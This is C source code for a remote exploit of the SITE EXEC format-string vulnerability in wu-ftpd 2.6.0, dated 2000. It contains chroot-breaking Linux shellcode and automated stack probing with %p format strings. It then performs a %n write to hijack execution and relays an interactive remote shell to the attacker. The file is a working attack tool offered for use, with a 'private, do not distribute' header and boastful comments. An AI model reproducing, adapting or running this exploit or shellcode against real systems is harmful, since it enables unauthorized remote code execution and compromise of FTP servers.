//
// Remote Exploit For SITE EXEC Bug In wuftpd - 2.6.0(1)
// Coded By Crashkiller '2000 <pawq@blue.profex.com.pl>
//
// Thx To: BugzPl,#hackingpl, and special thx to venglin for help with
//         format strings bugssss
//
// PRIVATE - DO NOT DISTRIBUTE IT!!!
// This exploit r0x ,couse it will find ret addreses automaticly for you :>
//
// "Grab your glocks when you see my style,call the cops when you see my style"
//
// Version 2.0 - New Method For Finding Addreses
//
//
// Ret address can be on 4,5 and 6 - i met only this three possiblities.
//

#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>

void logo() {
fprintf(stderr,"\n+--------------------------------+\n");
fprintf(stderr,  "|    WuFtpd Remote Exploit'2000  |\n");
fprintf(stderr,  "|       Coded By Crashkiller     |\n");
fprintf(stderr,  "+--------------------------------+\n\n");
}

char linuxcode[]= /* Lam3rZ chroot() code */
	"\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"
	"\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"
	"\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27"
	"\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31"
	"\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d"
	"\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46"
	"\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8"
	"\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
	"\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff"
	"\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31";


main(int argc,char *argv[]) {
    
    char   cmdbuf[8192];
    char   cbuf[1024];
    char   *t;
    char   nop[400];
    int    pip,i,a=22,st=0;
    struct sockaddr_in sck;
    struct hostent *hp;
    long   inet;
    int    port=21;
    fd_set fds;
    unsigned int aa;
    unsigned long   reta,retb,tmp,tmp2,retz,ist=0;
    int ret;
    int add=5;    
    
memset(cmdbuf,0x0,sizeof(cmdbuf));
memset(cbuf,0x0,sizeof(cbuf));
memset(nop,0x0,sizeof(nop));

logo();
if (argc<2) 
    { 
	fprintf(stderr,"Usage: %s [ip] [ret_location]\n",argv[0]); 
    	fprintf(stderr,"[ret_location] is optional parametr - it can be two
	               two things :
		       1) In format 0xbffffff
		       2) And in 4,5,6,7,8.. - this supply where exploit 
		          can find ret_location address - standard its 5
		       !! Use this parametr only if default settings fail\n",argv[0]); 
                  
    	exit(-1);
    }

if (argc>2) 
    { 
        reta=strtoul(argv[2],argv[2]+10,16);
	fprintf(stderr,"++ Using ret address: %x \n",reta); 
        ist=1;
	if (reta<20) { ist=0;add=reta;}
    }


pip=socket(PF_INET,SOCK_STREAM,0);

if (!pip) 
{
    perror("socket()");
    exit(-1);
}

inet=inet_addr(argv[1]);
if (inet==-1) {
if (hp=gethostbyname(argv[1])) memcpy(&inet,hp->h_addr,4); else inet=-1;
if (inet==-1) 
{ 
    fprintf(stderr,"Cant resolv %s!! \n",argv[1]);
    exit(-1);
}
}
sck.sin_family=PF_INET;
sck.sin_port=htons(port);
sck.sin_addr.s_addr=inet;

if (connect(pip,(struct sockaddr *)&sck,sizeof(sck))<0) 
{
    perror("Connect() ");
    exit(-1);
}

read(pip,cbuf,1023);
fprintf(stderr,"Connected to: %s \n",argv[1]);
fprintf(stderr,"Banner: %s \n",cbuf);
// Connected ,sending user info
strcpy(cmdbuf,"user ftp\n");write(pip,cmdbuf,strlen(cmdbuf));
memset(nop,0x90,sizeof(nop)-strlen(linuxcode)-10);

strcat(nop,linuxcode);

memset(cmdbuf,0x0,sizeof(cmdbuf));
sprintf(cmdbuf,"pass %s\n",nop);write(pip,cmdbuf,strlen(cmdbuf));
sleep(5);
read(pip,cmdbuf,sizeof(cmdbuf)-1);
memset(cmdbuf,0x0,sizeof(cmdbuf));
if (!strncmp(cmdbuf,"530",3))
    { 
	printf("loggin incorrect : %s \n",cmdbuf);
        exit(-1);
    }
    fprintf(stderr,"Logged in.. \n");
    fprintf(stderr,"+ Finding ret addresses \n");
if (ist==0) 
{
// reta
next:
    memset(cmdbuf,0x0,sizeof(cmdbuf));sprintf(cmdbuf,"SITE EXEC %%%d$p\n",add);
    write(pip,cmdbuf,strlen(cmdbuf));
    memset(cmdbuf,0x0,sizeof(cmdbuf));read(pip,cmdbuf,sizeof(cmdbuf)-1);
    if (!strncmp(cmdbuf+6,"$p",2))
    {
      fprintf(stderr,"[1m[31mWuftpd is not vulnerable : %s \n[0m",cmdbuf);
      exit(-1);
    } 
    if (strstr(cmdbuf,"??")) {
      fprintf(stderr,"[1m[31mWuftpd is not vulnerable : %s \n[0m",cmdbuf);
      exit(-1);
    } else {
    	fprintf(stderr,"[1m[32mWuftpd is vulnerable : %s \n[0m",cmdbuf);
    }
    reta=strtoul(strstr(cmdbuf,"-")+1,strstr(cmdbuf,"-")+11,16);
}
if ((reta&0xff)==0) { add++;goto next;}


//retb
st=0;
a=60;
while (a<=100) {
a++;
memset(cmdbuf,0x0,sizeof(cmdbuf));
sprintf(cmdbuf,"SITE EXEC aaa|%%%d$p\n",a);
 write(pip,cmdbuf,strlen(cmdbuf));
 memset(cmdbuf,0x0,sizeof(cmdbuf));read(pip,cmdbuf,sizeof(cmdbuf)-1);
usleep(1000);

    t=(char *)strstr(cmdbuf,"|");
    tmp=0;

if (t!=NULL) tmp=strtoul(t+1,t+11,16);
if (tmp!=0) 
{
        tmp2=tmp;
        tmp=(tmp>>16);
 if (tmp==0x807) 
     {
         retb=tmp2;
	 fprintf(stderr,"Cached with addres : 0x%x\n",retb);st=1;
	 break;
     }
 if (tmp==0x806) 
     {
         retb=tmp2;
	 fprintf(stderr,"Cached with addres : 0x%x\n",retb);st=1;
	 break;
     }

  }
}

if (st==0) 
{ 
    fprintf(stderr,"[1m[34m Sorry couldnt find proctitle address - fix me!!\n[0m");
    exit(-1);
}

memset(cmdbuf,0x0,sizeof(cmdbuf));
    printf("+ Finding correct offsets \n");
    fprintf(stderr,"+ Real ret addr : 0x %x \n",reta-0x58);
if (ist==0) reta=reta-0x58;

st=0;
a=100;
while (a<=320) {
a++;
memset(cmdbuf,0x0,sizeof(cmdbuf));
sprintf(cmdbuf,"SITE EXEC aaaaaaaaaaaaaaaaaaaaaaaaaabbbb%c%c\xff%c%c|%%%d$p\n",0x74,0xd0,0xff,0xbf,a);
/*
(reta & 0x000000ff),(reta & 0x0000ff00)>>8,
                  (reta & 0x00ff0000)>>16,
		  (reta & 0xff000000)>>24,a);*/
 write(pip,cmdbuf,strlen(cmdbuf));
 memset(cmdbuf,0x0,sizeof(cmdbuf));read(pip,cmdbuf,sizeof(cmdbuf)-1);
#ifdef DEBUG
 fprintf(stderr,"Outbuf is : %s \n",cmdbuf);
#endif
usleep(800);
    t=(char *)strstr(cmdbuf,"|");
    tmp=0;
if (t!=NULL) tmp=strtoul(t+1,t+11,16);
if (tmp!=0) 
{
        tmp2=tmp;
 if ((tmp==reta)||(tmp==0xbfffd074))
     {
	 fprintf(stderr,"Cached with addres : 0x%x and a = %d\n",tmp,a--);st=1;
	 break;
     }
  }
}

if (st==0) 
{ 
    fprintf(stderr,"[1m[34m Sorry couldnt find ret location address - fix me!!\n[0m");
    exit(-1);
}
//if (ist==0) reta=reta-0x58;

    retb=retb+100;
    printf("Ret      location : %x \n",reta);
    printf("Proctitle addres  : %x and %u \n",retb,retb);

// now we are exploiting the bug
aa=retb;
tmp2=reta;
 memset(cmdbuf,0x0,sizeof(cmdbuf));read(pip,cmdbuf,sizeof(cmdbuf)-1);
sprintf(cmdbuf,"SITE EXEC aaaaaaaaaaaaaaaaaaaaaaaaaabbbb%c%c\xff%c%c|%%%d$p\n",0x54,0xd0,0xff,0xbf,a);
/*(tmp2 & 0x000000ff),(tmp2 & 0x0000ff00)>>8,
                  (tmp2 & 0x00ff0000)>>16,
		  (tmp2 & 0xff000000)>>24,a);*/
// fprintf(stderr,"slemy : %s \n",cmdbuf);
 write(pip,cmdbuf,strlen(cmdbuf));
 usleep(500);
 memset(cmdbuf,0x0,sizeof(cmdbuf));read(pip,cmdbuf,sizeof(cmdbuf)-1);
    t=(char *)strstr(cmdbuf,"|");
    tmp=0;
if (t!=NULL) tmp=strtoul(t+1,t+11,16);
if ((tmp!=0)&&(tmp!=reta)) {
fprintf(stderr,"!!! Some problems with ret addres,is : 0x%x \n",tmp);
//exit(-1);
} else {
fprintf(stderr,"!!! Goin thru with  : 0x%x \n",tmp);
}

 memset(cmdbuf,0x0,sizeof(cmdbuf));
sprintf(cmdbuf,"SITE EXEC aaaaaaaaaaaaaaaaaaaaaaaaaabbbb%c%c\xff%c%c|%%.%ud%%%d$n\n",(reta & 0x000000ff),(reta & 0x0000ff00)>>8,
                  (reta & 0x00ff0000)>>16,
		  (reta & 0xff000000)>>24,aa,a);

 write(pip,cmdbuf,strlen(cmdbuf));
 memset(cmdbuf,0x0,sizeof(cmdbuf));

fprintf(stderr,"[1m[33m Wait for a shell.....\n[0m");
// w8 for shell    

while (1)     
{
    FD_ZERO(&fds);
    FD_SET(0,&fds);
    FD_SET(pip,&fds);
    select(255, &fds,NULL,NULL,NULL);
    if (FD_ISSET(pip,&fds)) 
    {
      memset(cbuf,0x0,sizeof(cbuf));
      ret=read(pip,cbuf,sizeof(cbuf)-1);
      if (ret<=0) 
       {          
         printf("Connection closed - EOF \n");
	 exit(-1);
       }
       printf("%s",cbuf);
      }
    if (FD_ISSET(0,&fds)) 
    {
      memset(cbuf,0x0,sizeof(cbuf));
      read(0,cbuf,sizeof(cbuf)-1);
      write(pip,cbuf,strlen(cbuf));
     }
}
close(pip);
}

